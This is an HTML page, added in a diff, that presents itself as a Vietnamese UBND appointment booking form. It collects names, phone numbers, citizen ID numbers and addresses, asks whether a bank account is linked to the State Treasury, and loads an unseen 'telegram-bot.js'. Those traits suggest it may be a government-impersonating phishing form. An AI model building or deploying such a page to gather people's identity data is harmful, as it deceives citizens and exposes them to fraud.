@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đặt lịch hẹn làm việc với UBND</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .form-group { margin-bottom: 1.25rem; }
+        .required::after { content: " *"; color: #dc2626; }
+        .tooltip-icon { cursor: help; display: inline-block; }
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #92400e;
+            box-shadow: 0 0 0 3px rgba(146, 64, 14, 0.1);
+        }
+        .checkbox-label { cursor: pointer; user-select: none; }
+    </style>
+</head>
+<body class="bg-gray-50 py-8 px-4">
+    <div class="max-w-4xl mx-auto bg-white rounded-lg shadow-md overflow-hidden">
+        <!-- Header -->
+        <div class="bg-amber-900 text-white px-6 py-4">
+            <div class="flex items-center justify-between">
+                <div>
+                    <h1 class="text-2xl font-bold">📅 Đặt lịch hẹn làm việc</h1>
+                    <p class="text-amber-100 text-sm mt-1">Ủy ban Nhân dân Phường/Xã</p>
+                </div>
+                <a href="index.html" class="text-amber-100 hover:text-white underline text-sm">
+                    ← Về trang chủ
+                </a>
+            </div>
+        </div>
+
+        <!-- Form Content -->
+        <form id="appointmentUBNDForm" class="p-6 space-y-8">
+            
+            <!-- 1. Thông tin cá nhân -->
+            <section>
+                <h2 class="text-xl font-semibold text-gray-800 mb-4 pb-2 border-b-2 border-amber-900">
+                    📝 1. Thông tin người đặt lịch
+                </h2>
+                
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div class="form-group">
+                        <label class="block text-sm font-medium text-gray-700 mb-2 required">
+                            Họ và tên
+                        </label>
+                        <input type="text" 
+                               name="fullName"
+                               class="w-full px-4 py-2 border border-gray-300 rounded-md"
+                               placeholder="Nguyễn Văn A"
+                               maxlength="100"
+                               required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="block text-sm font-medium text-gray-700 mb-2 required">
+                            Số điện thoại
+                        </label>
+                        <input type="tel" 
+                               name="phone"
+                               class="w-full px-4 py-2 border border-gray-300 rounded-md"
+                               placeholder="0912345678"
+                               pattern="[0-9]{10,11}"
+                               maxlength="11"
+                               required>
+                        <p class="text-xs text-gray-500 mt-1">Nhập 10-11 chữ số</p>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="block text-sm font-medium text-gray-700 mb-2">
+                            Email
+                        </label>
+                        <input type="email" 
+                               name="email"
+                               class="w-full px-4 py-2 border border-gray-300 rounded-md"
+                               placeholder="email@example.com"
+                               maxlength="100">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="block text-sm font-medium text-gray-700 mb-2 required">
+                            Số CCCD/CMND
+                        </label>
+                        <input type="text" 
+                               name="idNumber"
+                               class="w-full px-4 py-2 border border-gray-300 rounded-md"
+                               placeholder="001234567890"
+                               pattern="[0-9]{9,12}"
+                               maxlength="12"
+                               required>
+                        <p class="text-xs text-gray-500 mt-1">Nhập 9-12 chữ số</p>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="block text-sm font-medium text-gray-700 mb-2">
+                        Địa chỉ liên hệ
+                    </label>
+                    <input type="text" 
+                           name="address"
+                           class="w-full px-4 py-2 border border-gray-300 rounded-md"
+                           placeholder="Số nhà, đường, phường/xã, quận/huyện"
+                           maxlength="200">
+                </div>
+            </section>
+
+            <!-- 2. Thông tin lịch hẹn -->
+            <section>
+                <h2 class="text-xl font-semibold text-gray-800 mb-4 pb-2 border-b-2 border-amber-900">
+                    🗓️ 2. Thời gian và địa điểm
+                </h2>
+                
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div class="form-group">
+                        <label class="block text-sm font-medium text-gray-700 mb-2 required">
+                            Cơ quan/Đơn vị
+                        </label>
+                        <select name="organization" class="w-full px-4 py-2 border border-gray-300 rounded-md" required>
+                            <option value="">Chọn cơ quan</option>
+                            <option value="ubnd">UBND Phường/Xã</option>
+                            <option value="vanphong">Văn phòng - Thống kê</option>
+                            <option value="tuphap">Phòng Tư pháp - Hộ tịch</option>
+                            <option value="taichinh">Phòng Tài chính - Kế hoạch</option>
+                            <option value="vanhoa">Phòng Văn hóa - Xã hội</option>
+                            <option value="kinhte">Phòng Kinh tế - Hạ tầng</option>
+                            <option value="congan">Công an Phường/Xã</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="block text-sm font-medium text-gray-700 mb-2">
+                            Cán bộ tiếp nhận (nếu biết)
+                        </label>
+                        <input type="text" 
+                               name="officer"
+                               class="w-full px-4 py-2 border border-gray-300 rounded-md"
+                               placeholder="Tên cán bộ"
+                               maxlength="100">
+                    </div>
+
+                    <div class="form-group">
+                        <label class="block text-sm font-medium text-gray-700 mb-2 required">
+                            Ngày hẹn
+                        </label>
+                        <input type="date" 
+                               id="appointmentDate"
+                               name="appointmentDate"
+                               class="w-full px-4 py-2 border border-gray-300 rounded-md"
+                               required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="block text-sm font-medium text-gray-700 mb-2 required">
+                            Khung giờ mong muốn
+                        </label>
+                        <select name="timeSlot" class="w-full px-4 py-2 border border-gray-300 rounded-md" required>
+                            <option value="">Chọn khung giờ</option>
+                            <optgroup label="Buổi sáng">
+                                <option value="0730-0800">07:30 - 08:00</option>
+                                <option value="0800-0830">08:00 - 08:30</option>
+                                <option value="0830-0900">08:30 - 09:00</option>
+                                <option value="0900-0930">09:00 - 09:30</option>
+                                <option value="0930-1000">09:30 - 10:00</option>
+                                <option value="1000-1030">10:00 - 10:30</option>
+                                <option value="1030-1100">10:30 - 11:00</option>
+                                <option value="1100-1130">11:00 - 11:30</option>
+                            </optgroup>
+                            <optgroup label="Buổi chiều">
+                                <option value="1330-1400">13:30 - 14:00</option>
+                                <option value="1400-1430">14:00 - 14:30</option>
+                                <option value="1430-1500">14:30 - 15:00</option>
+                                <option value="1500-1530">15:00 - 15:30</option>
+                                <option value="1530-1600">15:30 - 16:00</option>
+                                <option value="1600-1630">16:00 - 16:30</option>
+                            </optgroup>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mt-4">
+                    <p class="text-sm text-blue-800">
+                        <strong>📌 Lưu ý:</strong> Thời gian làm việc: Sáng 07:30-11:30, Chiều 13:30-16:30 (Thứ 2 - Thứ 6)
+                    </p>
+                </div>
+            </section>
+
+            <!-- 3. Mục đích làm việc -->
+            <section>
+                <h2 class="text-xl font-semibold text-gray-800 mb-4 pb-2 border-b-2 border-amber-900">
+                    📋 3. Nội dung công việc
+                </h2>
+                
+                <div class="form-group">
+                    <label class="block text-sm font-medium text-gray-700 mb-2 required">
+                        Loại công việc
+                    </label>
+                    <select name="jobType" class="w-full px-4 py-2 border border-gray-300 rounded-md" id="loaiCongViec" required>
+                        <option value="">Chọn loại công việc</option>
+                        <optgroup label="Hộ tịch - Hành chính">
+                            <option value="khaisinh">Đăng ký khai sinh</option>
+                            <option value="kethon">Đăng ký kết hôn</option>
+                            <option value="lyhon">Đăng ký ly hôn</option>
+                            <option value="tuvong">Đăng ký tử vong</option>
+                            <option value="tamtru">Đăng ký tạm trú/tạm vắng</option>
+                            <option value="thanhtra">Thay đổi/sửa đổi hộ tịch</option>
+                        </optgroup>
+                        <optgroup label="Đất đai - Xây dựng">
+                            <option value="sotdo">Cấp sổ đỏ/sổ hồng</option>
+                            <option value="giayxaydung">Xin phép xây dựng</option>
+                            <option value="chuyennhuong">Chuyển nhượng quyền sử dụng đất</option>
+                        </optgroup>
+                        <optgroup label="Kinh doanh">
+                            <option value="dangkykd">Đăng ký kinh doanh</option>
+                            <option value="dangkyho">Đăng ký hộ kinh doanh</option>
+                        </optgroup>
+                        <optgroup label="Xã hội">
+                            <option value="xahoi">Hỗ trợ xã hội, trợ cấp</option>
+                            <option value="baohiem">Bảo hiểm y tế, xã hội</option>
+                        </optgroup>
+                        <optgroup label="Khác">
+                            <option value="traodoi">Trao đổi, tư vấn chính sách</option>
+                            <option value="phanani">Phản ánh, kiến nghị</option>
+                            <option value="khac">Công việc khác</option>
+                        </optgroup>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label class="block text-sm font-medium text-gray-700 mb-2 required">
+                        Mô tả chi tiết công việc
+                    </label>
+                    <textarea name="jobDescription" rows="5" 
+                              class="w-full px-4 py-2 border border-gray-300 rounded-md"
+                              placeholder="Vui lòng mô tả chi tiết nội dung công việc cần giải quyết..."
+                              minlength="20"
+                              maxlength="1000"
+                              required></textarea>
+                    <p class="text-xs text-gray-500 mt-1">Tối thiểu 20 ký tự, tối đa 1000 ký tự</p>
+                </div>
+
+                <div class="form-group">
+                    <label class="block text-sm font-medium text-gray-700 mb-2">
+                        Số lượng người tham gia
+                    </label>
+                    <input type="number" 
+                           name="participants"
+                           class="w-full px-4 py-2 border border-gray-300 rounded-md"
+                           min="1" 
+                           max="10" 
+                           value="1"
+                           required>
+                    <p class="text-xs text-gray-500 mt-1">Tối đa 10 người</p>
+                </div>
+            </section>
+
+            <!-- 4. Xác nhận thông tin -->
+            <section>
+                <h2 class="text-xl font-semibold text-gray-800 mb-4 pb-2 border-b-2 border-amber-900">
+                    ✅ 4. Xác nhận thông tin
+                </h2>
+                
+                <div class="space-y-3">
+                    <label class="flex items-start checkbox-label">
+                        <input type="checkbox" name="vneidLevel2" class="mt-1 h-4 w-4 text-amber-900 border-gray-300 rounded">
+                        <span class="ml-3 text-sm text-gray-700">
+                            Đã hoàn thành định danh điện tử VNeID mức 2
+                            <span class="tooltip-icon text-blue-600" title="Giúp xác thực danh tính nhanh chóng">ⓘ</span>
+                        </span>
+                    </label>
+
+                    <label class="flex items-start checkbox-label">
+                        <input type="checkbox" name="bankLinked" class="mt-1 h-4 w-4 text-amber-900 border-gray-300 rounded">
+                        <span class="ml-3 text-sm text-gray-700">
+                            Đã liên kết tài khoản ngân hàng với Kho bạc Nhà nước
+                            <span class="tooltip-icon text-blue-600" title="Cần thiết nếu có phát sinh phí thanh toán">ⓘ</span>
+                        </span>
+                    </label>
+
+                    <label class="flex items-start checkbox-label">
+                        <input type="checkbox" name="confirmAccuracy" class="mt-1 h-4 w-4 text-amber-900 border-gray-300 rounded" required>
+                        <span class="ml-3 text-sm text-gray-700">
+                            <span class="font-medium required">Tôi cam đoan</span> thông tin trên là chính xác và chịu trách nhiệm trước pháp luật về nội dung đã khai báo
+                        </span>
+                    </label>
+
+                    <label class="flex items-start checkbox-label">
+                        <input type="checkbox" name="confirmTerms" class="mt-1 h-4 w-4 text-amber-900 border-gray-300 rounded" required>
+                        <span class="ml-3 text-sm text-gray-700">
+                            <span class="font-medium required">Tôi đã đọc và đồng ý</span> với 
+                            <a href="#" class="text-amber-900 hover:underline">Quy định về đặt lịch hẹn</a> và 
+                            <a href="#" class="text-amber-900 hover:underline">Chính sách bảo mật</a>
+                        </span>
+                    </label>
+                </div>
+            </section>
+
+            <!-- Buttons -->
+            <div class="flex flex-col sm:flex-row gap-3 pt-6 border-t">
+                <button type="reset" 
+                        class="flex-1 px-6 py-3 bg-gray-100 text-gray-700 rounded-md hover:bg-gray-200 transition font-medium">
+                    🔄 Làm mới
+                </button>
+                <button type="submit" 
+                        class="flex-1 px-6 py-3 bg-amber-900 text-white rounded-md hover:bg-amber-800 transition font-medium shadow-md">
+                    📤 Đặt lịch hẹn
+                </button>
+            </div>
+
+            <p class="text-center text-xs text-gray-500 mt-4">
+                Thông tin của bạn được bảo mật theo Nghị định 13/2023/NĐ-CP về Bảo vệ dữ liệu cá nhân
+            </p>
+        </form>
+    </div>
+
+    <!-- Danh sách đăng ký -->
+    <div class="max-w-4xl mx-auto bg-white rounded-lg shadow-md overflow-hidden mt-6">
+        <div class="bg-amber-900 text-white px-6 py-4">
+            <div class="flex items-center justify-between">
+                <h2 class="text-xl font-bold">📋 Danh sách đăng ký</h2>
+                <button id="clearAllUBNDBtn" class="text-amber-100 hover:text-white underline text-sm">
+                    Xóa tất cả
+                </button>
+            </div>
+        </div>
+        <div id="appointmentsUBNDList" class="p-6">
+            <!-- Danh sách đăng ký sẽ được hiển thị ở đây -->
+        </div>
+    </div>
+
+    <!-- Support Info -->
+    <div class="max-w-4xl mx-auto mt-6 bg-white rounded-lg shadow-md p-6">
+        <h3 class="font-semibold text-gray-800 mb-3">📞 Hỗ trợ</h3>
+        <div class="grid md:grid-cols-3 gap-4 text-sm">
+            <div>
+                <p class="text-gray-600">Hotline:</p>
+                <p class="font-medium text-amber-900">1900 xxxx</p>
+            </div>
+            <div>
+                <p class="text-gray-600">Email:</p>
+                <p class="font-medium text-amber-900">ubnd@example.gov.vn</p>
+            </div>
+            <div>
+                <p class="text-gray-600">Giờ làm việc:</p>
+                <p class="font-medium text-amber-900">T2-T6: 7:30-16:30</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="telegram-bot.js"></script>
+    <script src="appointment-ubnd-script.js"></script>
+
+</body>
+</html>
+
